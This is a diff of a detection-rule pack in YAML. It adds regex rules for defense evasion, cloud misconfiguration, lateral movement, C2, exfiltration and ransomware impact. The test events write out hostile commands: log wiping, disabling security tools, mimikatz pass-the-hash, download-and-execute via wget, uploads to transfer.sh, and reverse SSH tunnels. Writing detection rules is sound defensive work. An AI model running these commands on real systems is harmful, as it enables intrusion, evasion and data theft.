+      - {field: event_type, regex: '^iam\.(privilege_granted|role_assigned|admin_granted)'}
+      - {field: text, regex: '(user\.account\.privilege\.grant|add member to role.{0,40}(global administrator|privileged role administrator)|AdministratorAccess|iam:\*|"Action":\s*"\*".{0,40}"Resource":\s*"\*")'}
+  tests:
+    - {event: {command_line: 'kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=eve'}, expect_match: true}
+    - {event: {event_type: iam.role_assigned}, expect_match: true}
+    - {event: {event_type: iam.role_viewed}, expect_match: false}
+
+# =============================================================== DEFENSE EVASION
+- id: TB-EVADE-001
+  name: Log clearing or command-history tampering
   severity: high
   confidence: 85
-  tactics: [TA0005]
+  techniques: [T1070.001, T1070.002, T1070.003]
+  tags: [log-clearing, defense-evasion]
+  match:
+    any:
+      - {field: command_line, regex: 'wevtutil(\.exe)?\s+(cl|clear-log)\b'}
+      - {field: command_line, regex: 'clear-eventlog|remove-eventlog'}
+      - {field: command_line, regex: '(unset\s+histfile|histsize=0|histfile=/dev/null|history\s+-c|rm\s+(-\w+\s+)?\S{0,40}\.(bash|zsh)_history|(>|truncate\s+-s\s?0)\s{0,3}\S{0,40}\.(bash|zsh)_history)'}
+      - {field: command_line, regex: '(shred|rm\s+(-\w+\s+)?|truncate\s+-s\s?0\s+|>\s{0,3})\s{0,3}/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog|audit/audit\.log|kern\.log)'}
+      - {field: event_type, regex: '^system\.(log_cleared|audit_log_cleared)|log_cleared'}
+      - {field: raw.event_code, in: ['1102', '104']}
+  tests:
+    - {event: {command_line: 'wevtutil cl Security'}, expect_match: true}
+    - {event: {command_line: 'cat /dev/null > /var/log/auth.log'}, expect_match: true}
+    - {event: {command_line: 'truncate -s 0 /var/log/auth.log'}, expect_match: true}
+    - {event: {command_line: 'export HISTFILE=/dev/null'}, expect_match: true}
+    - {event: {raw_data: {event_code: '1102'}}, expect_match: true}
+    - {event: {command_line: 'tail -f /var/log/auth.log'}, expect_match: false}
+
+- id: TB-EVADE-002
+  name: Security tooling disabled, excluded or uninstalled
+  severity: high
+  confidence: 80
+  techniques: [T1562.001, T1562.004]
+  tags: [defense-evasion, tamper]
+  match:
+    any:
+      - {field: command_line, regex: 'set-mppreference\s.{0,80}-disable(realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning|intrusionpreventionsystem)\s+\$?(true|1)'}
+      - {field: command_line, regex: 'set-mppreference\s.{0,40}-exclusion(path|process|extension)'}
+      - {field: command_line, regex: 'add-mppreference\s.{0,40}-exclusion'}
+      - {field: command_line, regex: 'netsh\s+advfirewall\s+set\s+\w+\s+state\s+off|netsh\s+firewall\s+set\s+opmode\s+disable'}
+      - {field: command_line, regex: '(systemctl|service)\s+(stop|disable|mask)\s+(auditd|audit|falco|osqueryd|ossec|wazuh-agent|wazuh|clamav-daemon|clamd|crowdstrike|falcon-sensor|sentinelone|cbagentd|rsyslog|syslog-ng|apparmor|fail2ban|ufw|firewalld)'}
+      - {field: command_line, regex: '(sc(\.exe)?\s+(stop|config|delete)\s+(windefend|sense|wdnissvc|wscsvc|sysmon\w{0,4}|csagent|sentinelagent|mbamservice|sophosmcs)|taskkill\s.{0,20}/im\s+(msmpeng|mssense|csfalcon\w{0,10}|sentinelagent|cb|savservice)\w{0,10}\.exe)'}
+      - {field: command_line, regex: '(auditctl\s+-e\s?0|setenforce\s+0|ufw\s+disable|iptables\s+-F\b|iptables\s+--flush|nft\s+flush\s+ruleset)'}
+      - {field: command_line, regex: 'reg(\.exe)?\s+add\s.{0,80}(disableantispyware|disablerealtimemonitoring|disableantivirus|tamperprotection)'}
+      - {field: command_line, regex: 'uninstall-windowsfeature\s+windows-defender|sc\s+config\s+sysmon'}
+  tests:
+    - {event: {command_line: 'Set-MpPreference -DisableRealtimeMonitoring $true'}, expect_match: true}
+    - {event: {command_line: 'Add-MpPreference -ExclusionPath C:\Users\Public'}, expect_match: true}
+    - {event: {command_line: 'systemctl stop auditd'}, expect_match: true}
+    - {event: {command_line: 'setenforce 0'}, expect_match: true}
+    - {event: {command_line: 'netsh advfirewall set allprofiles state off'}, expect_match: true}
+    - {event: {command_line: 'systemctl restart nginx'}, expect_match: false}
+
+- id: TB-EVADE-003
+  name: Masquerading system process running from an unexpected path
+  severity: high
+  confidence: 75
+  techniques: [T1036]
+  tags: [masquerading, defense-evasion]
+  match:
+    all:
+      - {field: process_name, regex: '^(svchost|lsass|csrss|winlogon|services|smss|wininit|spoolsv|taskhost\w{0,3}|dllhost|conhost)\.exe$'}
+      - {field: raw.process_path, regex: '.{3,}'}
+      - not: {field: raw.process_path, regex: '^(c:\\windows\\(system32|syswow64|winsxs)\\|\\systemroot\\system32\\|\\windows\\system32\\)'}
+  tests:
+    - {event: {process_name: svchost.exe, raw_data: {process_path: 'C:\Users\Public\svchost.exe'}}, expect_match: true}
+    - {event: {process_name: svchost.exe, raw_data: {process_path: 'C:\Windows\System32\svchost.exe'}}, expect_match: false}
+
+- id: TB-EVADE-004
+  name: Process injection or reflective loading indicators
+  severity: high
+  confidence: 70
+  techniques: [T1055, T1620]
+  tags: [injection, defense-evasion]
+  match:
+    any:
+      - {field: text, regex: '\b(createremotethread|ntcreatethreadex|queueuserapc|writeprocessmemory|virtualallocex|setthreadcontext|process hollowing|reflective dll)\b'}
+      - {field: raw.event_code, in: ['8']}
+      - {field: text, regex: 'invoke-(reflectivepeinjection|dllinjection|processhollow)|donut\.exe|shellcode inject'}
+  tests:
+    - {event: {title: 'CreateRemoteThread into explorer.exe'}, expect_match: true}
+    - {event: {title: 'Remote thread created'}, expect_match: false}
+
+- id: TB-EVADE-005
+  name: Indicator removal or timestomping of tools
+  severity: medium
+  confidence: 60
+  techniques: [T1070.004, T1070]
+  tags: [defense-evasion, anti-forensics]
+  match:
+    any:
+      - {field: command_line, regex: '(shred|sdelete(64)?(\.exe)?|cipher\s+/w:)\s.{0,60}(/tmp|\\temp|\\users|\.exe|\.sh|\.ps1)'}
+      - {field: command_line, regex: 'touch\s+-(r|d|t)\s+\S{1,60}\s+/(tmp|var|usr|dev/shm)/\S{1,60}'}
+      - {field: command_line, regex: 'timestomp|setmace|\(get-item\s.{0,40}\)\.(creation|lastwrite)time\s?='}
+  tests:
+    - {event: {command_line: 'sdelete64.exe -p 3 C:\Users\Public\payload.exe'}, expect_match: true}
+    - {event: {command_line: 'rm -f /tmp/build.log'}, expect_match: false}
+
+- id: TB-EVADE-006
+  name: Log source stopped or monitoring agent tampered with
+  severity: high
+  confidence: 70
+  techniques: [T1562.006, T1562.001]
+  tags: [defense-evasion, telemetry-gap]
+  match:
+    any:
+      - {field: event_type, regex: '^((agent|logging|sensor)\.|system\.log_source[._])(stopped|disconnected|silent|tamper|disabled|uninstalled)'}
+      - {field: text, regex: '(audit daemon (is )?(exiting|stopped)|auditd.{0,20}stopp|sysmon (service|driver).{0,20}(stopped|unloaded)|edr (sensor|agent) (tamper|uninstall|stopp)|wazuh agent.{0,20}(stopped|disconnected unexpectedly)|rsyslogd.{0,20}exiting)'}
+  tests:
+    - {event: {event_type: agent.stopped}, expect_match: true}
+    - {event: {event_type: system.log_source_silent}, expect_match: true}
+    - {event: {title: 'Sysmon service state changed: Stopped'}, expect_match: true}
+    - {event: {title: 'Sysmon service state changed: Running'}, expect_match: false}
+
+- id: TB-CLOUD-002
+  name: Cloud audit logging, detection or flow logging disabled
+  severity: high
+  confidence: 85
   techniques: [T1562.008]
   tags: [cloud, defense-evasion]
   match:
     any:
-      - {field: raw.eventName, in: [StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors, DeleteFlowLogs, DeleteDetector]}
-      - {field: event_type, regex: 'cloudtrail.{0,200}(stop|delete|disabled)'}
+      - {field: raw.eventName, in: [StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors, DeleteFlowLogs, DeleteDetector, StopConfigurationRecorder, DeleteConfigurationRecorder, DisableSecurityHub, DeleteLogGroup, DeleteLogStream, DisableAlarmActions, DeleteMemberAccounts, UpdateDetector, DeleteSink, DeleteLogging]}
+      - {field: event_type, regex: 'cloudtrail.{0,10}(stop|delete|disabled)|cloud\.(logging|audit)\.disabled'}
+      - {field: raw.operationName, regex: '(microsoft\.insights/diagnosticsettings/delete|microsoft\.security/securitycontacts/delete|microsoft\.operationalinsights/workspaces/delete)'}
+      - {field: raw.methodName, regex: '(google\.logging\.v2\.configservicev2\.(deletesink|updatesink)|logging\.sinks\.(delete|update))'}
+  tests:
+    - {event: {raw_data: {eventName: StopLogging}}, expect_match: true}
+    - {event: {raw_data: {eventName: DeleteDetector}}, expect_match: true}
+    - {event: {raw_data: {operationName: 'MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE'}}, expect_match: true}
+    - {event: {raw_data: {eventName: DescribeTrails}}, expect_match: false}
 
-- id: TB-CLOUD-003
-  name: Administrator privileges granted in the cloud
-  severity: high
-  confidence: 75
-  tactics: [TA0004, TA0003]
-  techniques: [T1098.003, T1078.004]
-  tags: [cloud, iam, privilege-escalation]
-  match:
-    any:
-      - {field: raw.eventName, in: [AttachUserPolicy, AttachRolePolicy, PutUserPolicy, PutRolePolicy, CreateAccessKey, CreateLoginProfile]}
-      - {field: text, regex: 'AdministratorAccess|"Action":\s*"\*"'}
-
-- id: TB-CLOUD-004
-  name: Cloud root account usage
+# =============================================================== CLOUD IDENTITY & CONFIGURATION
+- id: TB-CLOUD-001
+  name: Storage made publicly accessible or ACL/policy opened to everyone
   severity: high
   confidence: 80
-  tactics: [TA0004]
+  techniques: [T1530]
+  tags: [cloud, storage, public-exposure]
+  match:
+    any:
+      - {field: event_type, regex: 'bucket.{0,20}public|public.{0,20}bucket|s3.{0,20}public|storage.{0,20}public'}
+      - all:
+          - {field: raw.eventName, in: [PutBucketAcl, PutBucketPolicy, PutObjectAcl, DeleteBucketPublicAccessBlock, PutBucketPublicAccessBlock]}
+          - {field: text, regex: '(allusers|authenticatedusers|"principal":\s*"\*"|"principal":\s*\{\s*"aws":\s*"\*"|blockpublicacls.{0,6}false|restrictpublicbuckets.{0,6}false)'}
+      - {field: raw.eventName, equals: DeleteBucketPublicAccessBlock}
+      - {field: raw.methodName, regex: 'storage\.(buckets|objects)\.setiampolicy', }
+  tests:
+    - {event: {raw_data: {eventName: PutBucketAcl, requestParameters: {AccessControlPolicy: {grant: 'AllUsers READ'}}}}, expect_match: true}
+    - {event: {raw_data: {eventName: DeleteBucketPublicAccessBlock}}, expect_match: true}
+    - {event: {raw_data: {eventName: PutBucketAcl, requestParameters: {grant: 'CanonicalUser'}}}, expect_match: false}
+
+- id: TB-CLOUD-003
+  name: Administrator privileges, access keys or login profile granted in the cloud
+  severity: high
+  confidence: 75
+  techniques: [T1098.003, T1098.001, T1078.004]
+  tags: [cloud, iam, privilege-escalation]
+  tuning: Expected from your IaC pipeline principal; exclude that identity.
+  match:
+    any:
+      - all:
+          - {field: raw.eventName, in: [AttachUserPolicy, AttachRolePolicy, PutUserPolicy, PutRolePolicy, AttachGroupPolicy, CreatePolicyVersion, SetDefaultPolicyVersion]}
+          - {field: text, regex: '(AdministratorAccess|"Action":\s*"\*"|iam:\*|PowerUserAccess|:policy/IAMFullAccess)'}
+      - {field: raw.eventName, in: [CreateLoginProfile, UpdateLoginProfile, UpdateAssumeRolePolicy]}
+      - all:
+          - {field: raw.eventName, equals: CreateAccessKey}
+          - {field: raw.requestParameters.userName, regex: '.{1,}'}
+          - not: {field: raw.requestParameters.userName, equals: ''}
+  tests:
+    - {event: {raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: 'arn:aws:iam::aws:policy/AdministratorAccess'}}}, expect_match: true}
+    - {event: {raw_data: {eventName: CreateLoginProfile}}, expect_match: true}
+    - {event: {raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: 'arn:aws:iam::aws:policy/ReadOnlyAccess'}}}, expect_match: false}
+
+- id: TB-CLOUD-004
+  name: Cloud root / owner account used
+  severity: high
+  confidence: 80
   techniques: [T1078.004]
   tags: [cloud, root-account]
-  match: {field: raw.userIdentity.type, equals: Root}
+  match:
+    any:
+      - {field: raw.userIdentity.type, equals: Root}
+      - {field: raw.actor.type, equals: SuperAdmin}
+  tests:
+    - {event: {raw_data: {userIdentity: {type: Root}}}, expect_match: true}
+    - {event: {raw_data: {userIdentity: {type: IAMUser}}}, expect_match: false}
+    - {event: {event_type: authentication.success, username: root}, expect_match: false}
 
 - id: TB-CLOUD-005
-  name: Console login without MFA
+  name: Console sign-in without MFA
   severity: medium
   confidence: 65
-  tactics: [TA0001]
   techniques: [T1078.004]
   tags: [cloud, mfa]
   match:
     all:
       - {field: raw.eventName, equals: ConsoleLogin}
       - {field: raw.additionalEventData.MFAUsed, equals: 'No'}
+      - {field: raw.responseElements.ConsoleLogin, equals: Success}
+  tests:
+    - {event: {raw_data: {eventName: ConsoleLogin, additionalEventData: {MFAUsed: 'No'}, responseElements: {ConsoleLogin: Success}}}, expect_match: true}
+    - {event: {raw_data: {eventName: ConsoleLogin, additionalEventData: {MFAUsed: 'Yes'}, responseElements: {ConsoleLogin: Success}}}, expect_match: false}
+
+- id: TB-CLOUD-006
+  name: Network security group / firewall opened to the internet on a management port
+  severity: high
+  confidence: 80
+  techniques: [T1562.007]
+  tags: [cloud, network, exposure]
+  match:
+    any:
+      - all:
+          - {field: raw.eventName, in: [AuthorizeSecurityGroupIngress, ModifySecurityGroupRules]}
+          - {field: text, regex: '(0\.0\.0\.0/0|::/0)[\s\S]{0,80}\b(22|3389|5985|5986|23|3306|5432|1433|27017|6379|9200|445)\b|\b(22|3389|5985|5986|23|3306|5432|1433|27017|6379|9200|445)\b[\s\S]{0,80}(0\.0\.0\.0/0|::/0)'}
+      - all:
+          - {field: raw.operationName, regex: 'microsoft\.network/networksecuritygroups/securityrules/write'}
+          - {field: text, regex: '(\*|0\.0\.0\.0/0|internet).{0,80}(22|3389|3306|1433)'}
+  tests:
+    - {event: {raw_data: {eventName: AuthorizeSecurityGroupIngress, requestParameters: {cidrIp: '0.0.0.0/0', fromPort: 22, toPort: 22}}}, expect_match: true}
+    - {event: {raw_data: {eventName: AuthorizeSecurityGroupIngress, requestParameters: {cidrIp: '10.0.0.0/8', fromPort: 22}}}, expect_match: false}
+
+- id: TB-CLOUD-007
+  name: Data or snapshot shared outside the account, replication to another account
+  severity: high
+  confidence: 75
+  techniques: [T1537]
+  tags: [cloud, exfiltration]
+  match:
+    any:
+      - {field: raw.eventName, in: [ModifySnapshotAttribute, ModifyImageAttribute, ModifyDBSnapshotAttribute, ModifyDBClusterSnapshotAttribute, PutBucketReplication, ShareSnapshot]}
+      - {field: raw.methodName, regex: 'compute\.(snapshots|images|disks)\.setiampolicy|storage\.buckets\.setiampolicy.{0,60}allusers'}
+  tests:
+    - {event: {raw_data: {eventName: ModifySnapshotAttribute}}, expect_match: true}
+    - {event: {raw_data: {eventName: DescribeSnapshots}}, expect_match: false}
+
+- id: TB-CLOUD-008
+  name: Destructive or recovery-inhibiting cloud API call
+  severity: high
+  confidence: 75
+  techniques: [T1485, T1490, T1531]
+  tags: [cloud, destruction]
+  tuning: Review the actor and change ticket; legitimate decommissioning triggers this.
+  match:
+    any:
+      - {field: raw.eventName, in: [ScheduleKeyDeletion, DisableKey, DeleteBackupVault, DeleteRecoveryPoint, DeleteBackupPlan, DeleteDBSnapshot, DeleteSnapshot, DeleteDBInstance, DeleteDBCluster, DeleteBucket, DeleteVault, PurgeQueue, DeleteVolume]}
+      - {field: raw.operationName, regex: 'microsoft\.(recoveryservices/vaults/delete|compute/(disks|snapshots)/delete|storage/storageaccounts/delete|sql/servers/databases/delete)'}
+  tests:
+    - {event: {raw_data: {eventName: ScheduleKeyDeletion}}, expect_match: true}
+    - {event: {raw_data: {eventName: DeleteBackupVault}}, expect_match: true}
+    - {event: {raw_data: {eventName: ListBuckets}}, expect_match: false}
+
+- id: TB-CLOUD-009
+  name: Mailbox forwarding or inbox rule created (email collection)
+  severity: high
+  confidence: 75
+  techniques: [T1114.003]
+  tags: [cloud, email, collection]
+  match:
+    any:
+      - {field: command_line, regex: '(new|set)-(inboxrule|mailbox|transportrule).{0,120}(forwardto|forwardingsmtpaddress|forwardingaddress|redirectto|forwardasattachmentto)'}
+      - {field: raw.operation, in: [New-InboxRule, Set-InboxRule, UpdateInboxRules, Set-Mailbox, New-TransportRule]}
+      - {field: raw.eventName, equals: UpdateInboxRules}
+  tests:
+    - {event: {raw_data: {operation: New-InboxRule, parameters: 'ForwardTo=attacker@example.com'}}, expect_match: true}
+    - {event: {raw_data: {operation: MailItemsAccessed}}, expect_match: false}
+
+# =============================================================== LATERAL MOVEMENT
+- id: TB-LAT-002
+  name: Administrative share access or tool transfer to a remote host
+  severity: high
+  confidence: 70
+  techniques: [T1021.002, T1570]
+  tags: [lateral-movement, smb]
+  match:
+    any:
+      - {field: command_line, regex: '(copy|xcopy|robocopy|move)\s.{0,100}\\\\\S{1,60}\\(admin\$|c\$|d\$|ipc\$)\\\S{0,80}\.(exe|dll|ps1|bat|vbs|sys|msi)'}
+      - {field: command_line, regex: 'net(1)?(\.exe)?\s+use\s+\\\\\S{1,60}\\(admin\$|c\$|ipc\$)\s.{0,40}/user:'}
+      - all:
+          - {field: raw.event_code, equals: '5140'}
+          - {field: raw.share_name, regex: '\\\\\*\\(admin\$|c\$|ipc\$)'}
+          - not: {field: username, regex: '\$$'}
+  tests:
+    - {event: {command_line: 'copy payload.exe \\10.0.0.9\C$\Windows\Temp\payload.exe'}, expect_match: true}
+    - {event: {command_line: 'net use \\10.0.0.9\IPC$ /user:corp\admin Passw0rd'}, expect_match: true}
+    - {event: {command_line: 'net use Z: \\files\public'}, expect_match: false}
+
+- id: TB-LAT-003
+  name: Pass-the-hash / alternate credential logon pattern
+  severity: high
+  confidence: 70
+  techniques: [T1550.002]
+  tags: [lateral-movement, ntlm]
+  match:
+    any:
+      - {field: command_line, regex: 'sekurlsa::pth|pth-winexe|pth-smbclient|wmiexec\.py.{0,40}-hashes|-hashes\s+[a-f0-9]{32}:[a-f0-9]{32}'}
+      - all:
+          - {field: raw.event_code, equals: '4624'}
+          - {field: raw.logon_type, in: ['9']}
+          - {field: raw.authentication_package, regex: '(negotiate|ntlm)'}
+          - {field: raw.logon_process, regex: 'seclogo'}
+  tests:
+    - {event: {command_line: 'mimikatz sekurlsa::pth /user:admin /domain:corp /ntlm:aad3b435b51404eeaad3b435b51404ee'}, expect_match: true}
+    - {event: {raw_data: {event_code: '4624', logon_type: '9', authentication_package: Negotiate, logon_process: seclogo}}, expect_match: true}
+    - {event: {raw_data: {event_code: '4624', logon_type: '3', authentication_package: NTLM, logon_process: NtLmSsp}}, expect_match: false}
+
+- id: TB-LAT-004
+  name: Inbound administrative remote-access over SSH/RDP with tunnelling flags
+  severity: medium
+  confidence: 60
+  techniques: [T1021.004, T1572]
+  tags: [lateral-movement, tunneling]
+  match:
+    any:
+      - {field: command_line, regex: '\bssh(\.exe)?\s.{0,80}-(R|L|D)\s?\S{1,40}:\d{1,5}.{0,40}(-N|-f)|\bssh\s.{0,40}-N\s.{0,60}-(R|L|D)\s?\d'}
+      - {field: command_line, regex: '(plink|chisel|ligolo|frpc?|sshuttle|proxychains\d?|socat\s+tcp-listen)\b.{0,100}(-R|-L|-D|client|agent|--socks|tcp-listen)'}
+  tests:
+    - {event: {command_line: 'ssh -N -R 8080:127.0.0.1:3389 user@198.51.100.7'}, expect_match: true}
+    - {event: {command_line: 'chisel client 198.51.100.7:8000 R:socks'}, expect_match: true}
+    - {event: {command_line: 'ssh admin@10.0.0.5'}, expect_match: false}
+
+# =============================================================== COMMAND AND CONTROL
+- id: TB-NET-003
+  name: Known C2 framework or implant indicator
+  severity: high
+  confidence: 80
+  techniques: [T1071.001, T1573]
+  tags: [c2, malware]
+  match:
+    any:
+      - {field: text, regex: '\b(cobalt ?strike|beacon\.(dll|exe)|meterpreter|sliver[- ]?(c2|implant)|havoc( |-)?c2|brute ?ratel|empire stager|posh-?c2|covenant grunt|mythic|merlin agent|metasploit)\b'}
+      - {field: raw.user_agent, regex: '(mozilla/4\.0 \(compatible; msie 6\.0; windows nt 5\.1\)|mozilla/5\.0 \(compatible; msie 9\.0; windows nt 6\.1; trident/5\.0; (yie8|slcc2)\))'}
+  tests:
+    - {event: {title: 'Cobalt Strike beacon detected on host'}, expect_match: true}
+    - {event: {title: 'Cobalt paint order shipped'}, expect_match: false}
+
+- id: TB-NET-002
+  name: DNS tunnelling or algorithmic-domain indicators
+  severity: medium
+  confidence: 60
+  techniques: [T1071.004, T1568]
+  tags: [dns-tunnel, c2]
+  tuning: CDNs and security vendors use long labels; allow-list their zones.
+  match:
+    any:
+      - {field: raw.query_length, gte: 100}
+      - {field: event_type, regex: 'dns.{0,10}tunnel'}
+      - all:
+          - {field: event_type, regex: '^network\.dns'}
+          - {field: raw.query, regex: '^[a-z0-9]{35,}(\.[a-z0-9-]{1,30}){1,3}$'}
+      - all:
+          - {field: event_type, regex: '^network\.dns'}
+          - {field: raw.query_type, in: [TXT, NULL, ANY]}
+          - {field: raw.query, regex: '^[a-z0-9._-]{50,}'}
+  tests:
+    - {event: {event_type: network.dns, raw_data: {query: 'a3f9b2c1d4e5f60718293a4b5c6d7e8f9012a3b4c5.tunnel.example.net'}}, expect_match: true}
+    - {event: {raw_data: {query_length: 140}}, expect_match: true}
+    - {event: {event_type: network.dns, raw_data: {query: 'www.example.org'}}, expect_match: false}
+
+- id: TB-C2-003
+  name: Traffic to anonymising, tunnelling or paste/exfil web services
+  severity: medium
+  confidence: 65
+  techniques: [T1572, T1090, T1102, T1567]
+  tags: [c2, exfiltration, tunneling]
+  tuning: Developer machines use ngrok legitimately; allow-list by asset.
+  match:
+    any:
+      - {field: text, regex: '(\.onion\b|[a-z0-9-]{3,40}\.(ngrok\.io|ngrok-free\.app|trycloudflare\.com|serveo\.net|localhost\.run|loca\.lt|pagekite\.me|bore\.pub|ngrok\.app))'}
+      - {field: text, regex: '(api\.telegram\.org/bot|discord(app)?\.com/api/webhooks/|transfer\.sh|file\.io|anonfiles|gofile\.io|temp\.sh|pastebin\.com/raw|paste\.ee/r|ghostbin|0x0\.st)'}
+  tests:
+    - {event: {event_type: network.dns, raw_data: {query: 'abcd1234.ngrok.io'}}, expect_match: true}
+    - {event: {command_line: 'curl -F file=@/tmp/data.zip https://transfer.sh/'}, expect_match: true}
+    - {event: {event_type: network.dns, raw_data: {query: 'docs.example.org'}}, expect_match: false}
+
+- id: TB-C2-004
+  name: Connection to a port commonly used by offensive tooling
+  severity: medium
+  confidence: 55
+  techniques: [T1095, T1571]
+  tags: [c2, network]
+  match:
+    all:
+      - {field: event_type, regex: '^network\.(connection|firewall)'}
+      - {field: destination_port, in: [4444, 4443, 1337, 31337, 50050, 6666, 6667, 9001, 9030, 8333]}
+      - {field: raw.direction, in: [outbound, egress, out]}
+  tests:
+    - {event: {event_type: network.connection, destination_port: 4444, raw_data: {direction: outbound}}, expect_match: true}
+    - {event: {event_type: network.connection, destination_port: 443, raw_data: {direction: outbound}}, expect_match: false}
+
+- id: TB-C2-005
+  name: Remote administration / tunnelling software installed or executed on a server
+  severity: medium
+  confidence: 55
+  techniques: [T1219]
+  tags: [c2, remote-access-tool]
+  tuning: Expected on helpdesk endpoints; scope to servers.
+  match:
+    any:
+      - {field: process_name, regex: '^(anydesk|teamviewer(_service)?|rustdesk|ammyy_admin|screenconnect\.clientservice|atera\w{0,10}|splashtop\w{0,10}|ultraviewer\w{0,10}|meshagent|tacticalrmm)(\.exe)?$'}
+      - {field: command_line, regex: '\b(anydesk|rustdesk|meshagent|screenconnect)(\.exe)?\s.{0,40}(--install|--silent|/silent|--service|-i\s)'}
+  tests:
+    - {event: {process_name: AnyDesk.exe}, expect_match: true}
+    - {event: {process_name: chrome.exe}, expect_match: false}
+
+- id: TB-C2-006
+  name: Tool downloaded to a staging directory and marked executable
+  severity: medium
+  confidence: 70
+  techniques: [T1105]
+  tags: [ingress-tool-transfer]
+  match:
+    any:
+      - {field: command_line, regex: '(wget|curl)\s.{0,150}(-o|-O|--output)\s?(/tmp|/dev/shm|/var/tmp|\.)\S{0,60}.{0,60}(chmod\s+(\+x|7\d\d)|&&\s?\./|;\s?\./|;\s?sh\s)'}
+      - {field: command_line, regex: '(wget|curl)\s+https?://\S{1,120}\s+-(o|O)\s?/(tmp|dev/shm|var/tmp)/\S{1,60}'}
+      - {field: command_line, regex: '(invoke-webrequest|iwr|wget|curl)(\.exe)?\s.{0,100}-(outfile|o)\s.{0,20}(\\temp\\|\\appdata\\|\\users\\public\\|\\programdata\\).{0,40}\.(exe|dll|ps1|bat|scr|vbs)'}
+      - {field: command_line, regex: '(tftp|ftp)(\.exe)?\s+(-i\s+)?\S{1,40}\s+(get|put)\s'}
+  tests:
+    - {event: {command_line: 'wget http://198.51.100.7/x -O /tmp/x && chmod +x /tmp/x && /tmp/x'}, expect_match: true}
+    - {event: {command_line: 'Invoke-WebRequest http://198.51.100.7/a.exe -OutFile C:\Users\Public\a.exe'}, expect_match: true}
+    - {event: {command_line: 'curl -o /tmp/index.html https://example.org'}, expect_match: false}
+
+# =============================================================== COLLECTION / EXFILTRATION
+- id: TB-EXFIL-001
+  name: Large outbound transfer
+  severity: medium
+  confidence: 55
+  techniques: [T1048, T1567]
+  tags: [exfiltration]
+  tuning: Raise the byte threshold or allow-list backup targets for your environment.
+  match:
+    any:
+      - {field: raw.bytes_out, gte: 500000000}
+      - {field: raw.bytes_sent, gte: 500000000}
+      - {field: raw.network_bytes_out, gte: 500000000}
+      - {field: event_type, regex: 'exfil|data_transfer_anomal'}
+  tests:
+    - {event: {raw_data: {bytes_out: 900000000}}, expect_match: true}
+    - {event: {raw_data: {bytes_out: 12000}}, expect_match: false}
+
+- id: TB-EXFIL-002
+  name: Data staged and archived for exfiltration
+  severity: medium
+  confidence: 60
+  techniques: [T1560.001, T1074]
+  tags: [staging, collection]
+  match:
+    any:
+      - {field: command_line, regex: '(7z|7za|rar|zip|tar|gzip|pigz)(\.exe)?\s.{0,60}(a|-c[zjJ]?f|-r|-p\S{0,20}).{0,120}(\\users\\|/home/|/etc/|/var/www|/root/|\.sql|\.db|\.pst|\.kdbx|documents|desktop)'}
+      - {field: command_line, regex: '(compress-archive|\bmakecab\b|\brar\s+a\b).{0,120}(\\users\\|documents|desktop|\.pst|\.kdbx)'}
+      - {field: command_line, regex: '(mysqldump|pg_dump|mongodump|sqlcmd\s.{0,60}-q\s.{0,10}backup|bcp\s.{0,60}\sout\s|redis-cli\s.{0,20}--rdb)'}
+  tests:
+    - {event: {command_line: 'tar czf /tmp/home.tgz /home/alice/documents /etc/ssh'}, expect_match: true}
+    - {event: {command_line: 'mysqldump -u root -p customers > /tmp/c.sql'}, expect_match: true}
+    - {event: {command_line: 'tar xzf release.tgz'}, expect_match: false}
+
+- id: TB-EXFIL-003
+  name: Data uploaded to an external service with a sync / transfer utility
+  severity: high
+  confidence: 70
+  techniques: [T1567.002, T1048]
+  tags: [exfiltration, cloud-storage]
+  tuning: Approved backup jobs using rclone/aws cli should be allow-listed by asset_name.
+  match:
+    any:
+      - {field: command_line, regex: '\brclone\s+(copy|sync|move|copyto)\s.{0,120}\S+:'}
+      - {field: command_line, regex: '\b(megacmd|mega-put|megatools\s+put|mega-cmd)\b'}
+      - {field: command_line, regex: 'aws\s+s3\s+(cp|sync|mv)\s.{0,100}s3://(?!(corp|internal))\S{1,60}'}
+      - {field: command_line, regex: '(gsutil\s+(cp|rsync)|az\s+storage\s+blob\s+upload(-batch)?|azcopy\s+(copy|sync))\s.{0,160}(https?://|gs://|\.blob\.core\.windows\.net)'}
+      - {field: command_line, regex: 'curl\s.{0,80}(-T|--upload-file|-F\s?\S{1,20}=@|--data-binary\s@).{0,120}https?://'}
+      - {field: command_line, regex: '(scp|rsync)\s.{0,40}-\w*r\w*\s.{0,80}\S+@(\d{1,3}\.){3}\d{1,3}:'}
+  tests:
+    - {event: {command_line: 'rclone copy /srv/data remote:exfil --transfers 16'}, expect_match: true}
+    - {event: {command_line: 'curl -F file=@/tmp/d.zip https://upload.example.net/'}, expect_match: true}
+    - {event: {command_line: 'rclone version'}, expect_match: false}
+
+- id: TB-EXFIL-004
+  name: Removable media copy of sensitive or bulk data
+  severity: medium
+  confidence: 60
+  techniques: [T1052.001]
+  tags: [insider, exfiltration, usb]
+  match:
+    all:
+      - {field: event_type, regex: '^(device|usb|file)\.(usb|removable|copy_to_usb|write_removable)'}
+      - {field: raw.file_count, gte: 50}
+  tests:
+    - {event: {event_type: file.copy_to_usb, raw_data: {file_count: 400}}, expect_match: true}
+    - {event: {event_type: file.copy_to_usb, raw_data: {file_count: 2}}, expect_match: false}
+
+# =============================================================== IMPACT
+- id: TB-IMPACT-001
+  name: Shadow copy, backup or recovery destruction
+  severity: critical
+  confidence: 90
+  techniques: [T1490]
+  tags: [ransomware, inhibit-recovery]
+  match:
+    any:
+      - {field: command_line, regex: 'vssadmin(\.exe)?\s+(delete\s+shadows|resize\s+shadowstorage\s.{0,60}maxsize)'}
+      - {field: command_line, regex: 'wmic\s+(/namespace:\\\\root\\default\s+)?shadowcopy\s+delete|get-wmiobject\s+win32_shadowcopy.{0,30}delete'}
+      - {field: command_line, regex: 'bcdedit(\.exe)?\s.{0,60}(recoveryenabled\s+no|bootstatuspolicy\s+ignoreallfailures)'}
+      - {field: command_line, regex: 'wbadmin\s+(delete\s+(catalog|systemstatebackup|backup)|stop\s+job)'}
+      - {field: command_line, regex: 'fsutil\s+usn\s+deletejournal|vssadmin.{0,20}create\s+shadow.{0,100}(copy|ntds)'}
+      - {field: command_line, regex: 'diskshadow(\.exe)?\s.{0,60}(delete\s+shadows|/s\s)'}
